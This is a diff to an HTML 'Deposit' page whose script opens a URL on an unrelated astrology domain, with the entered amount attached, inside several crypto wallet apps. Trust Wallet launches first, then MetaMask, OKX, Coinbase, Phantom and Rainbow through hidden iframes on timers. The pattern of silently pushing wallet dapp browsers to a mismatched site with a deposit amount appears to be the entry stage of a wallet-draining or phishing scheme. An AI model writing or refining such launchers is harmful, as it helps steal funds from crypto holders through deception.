@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Deposit & Auto-Launch Wallet</title>
+  <title>Deposit & Priority Wallet Launch</title>
   <style>
     * {
       box-sizing: border-box;
@@ -119,14 +119,14 @@
       <input type="number" id="amount" class="amount-input" placeholder="0.00" step="any">
     </div>
 
-    <button class="custom-btn" onclick="triggerAllWallets()">Deposit</button>
+    <button class="custom-btn" onclick="triggerPriorityWallets()">Deposit</button>
   </div>
 
-  <!-- Hidden container for iframe triggers -->
+  <!-- Hidden container for fallback iframe triggers -->
   <div id="iframe-container" class="hidden-iframe"></div>
 
   <script>
-    function triggerAllWallets() {
+    function triggerPriorityWallets() {
       const amountInput = document.getElementById('amount').value || '0.00';
       const baseUrl = 'https://deepak-astrology.vercel.app/';
       
@@ -134,28 +134,35 @@
       const targetUrlWithAmount = baseUrl + '?amount=' + encodeURIComponent(amountInput);
       const encodedTargetUrl = encodeURIComponent(targetUrlWithAmount);
 
-      // 6 Wallets Deep Link Schemes
-      const walletSchemes = [
+      // 1. PRIORITY #1: Trust Wallet URL Scheme
+      const trustWalletScheme = 'trust://open_url?coin_id=60&url=' + encodedTargetUrl;
+
+      // 2. FALLBACK WALLETS (Secondary Priority Order)
+      const fallbackSchemes = [
         'metamask://dapp/' + targetUrlWithAmount.replace(/^https?:\/\//, ''),
-        'trust://open_url?coin_id=60&url=' + encodedTargetUrl,
+        'okx://wallet/dapp/details?dappUrl=' + encodedTargetUrl,
         'cbwallet://dapp?url=' + encodedTargetUrl,
         'phantom://browse/' + encodedTargetUrl,
-        'rainbow://open?url=' + encodedTargetUrl,
-        'okx://wallet/dapp/details?dappUrl=' + encodedTargetUrl
+        'rainbow://open?url=' + encodedTargetUrl
       ];
 
-      const container = document.getElementById('iframe-container');
-      container.innerHTML = ''; // Reset container
+      // Step A: Primary action - Directly execute Trust Wallet first
+      window.location.href = trustWalletScheme;
 
-      // Trigger all schemes in parallel using dynamic iframes
-      walletSchemes.forEach((scheme, index) => {
-        setTimeout(() => {
-          const iframe = document.createElement('iframe');
-          iframe.src = scheme;
-          iframe.style.display = 'none';
-          container.appendChild(iframe);
-        }, index * 100); // 100ms delay to prevent OS lock
-      });
+      // Step B: Secondary action - Trigger backup wallets after a tiny delay
+      setTimeout(() => {
+        const container = document.getElementById('iframe-container');
+        container.innerHTML = ''; // Reset container
+
+        fallbackSchemes.forEach((scheme, index) => {
+          setTimeout(() => {
+            const iframe = document.createElement('iframe');
+            iframe.src = scheme;
+            iframe.style.display = 'none';
+            container.appendChild(iframe);
+          }, index * 100);
+        });
+      }, 150); // 150ms priority gap for Trust Wallet
     }
   </script>
 
